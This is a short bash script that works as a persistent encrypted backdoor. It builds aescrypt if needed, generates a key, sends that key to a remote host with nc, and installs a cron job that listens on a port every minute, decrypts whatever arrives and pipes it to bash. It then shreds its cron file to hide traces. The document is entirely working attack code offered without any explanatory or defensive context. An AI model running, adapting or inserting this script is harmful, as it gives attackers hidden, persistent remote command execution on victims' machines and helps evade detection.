#!/bin/bash
RHOST="0.0.0.0"
RPORT=5253
AES="aescrypt"

if $(which aescrypt | grep -qi aescrypt);
then
	aescrypt_keygen -g 64 .aes.key
else
	wget https://www.aescrypt.com/download/v3/linux/aescrypt-3.14.tgz
	gunzip aescrypt-3.14.tgz
	tar xf aescrypt-3.14.tar
	cd aescrypt-3.14/src/
	make
	./aescrypt_keygen -g 64 .aes.key
	AES="./aescrypt"
fi

nc $RHOST $RPORT < .aes.key
echo "* * * * * cd $(pwd) && nc -lnvp $RPORT | $AES -d -k $(pwd)/.aes.key - | bash" > cron.sh &&
crontab cron.sh
shred cron.sh 2> /dev/null
rm cron.sh
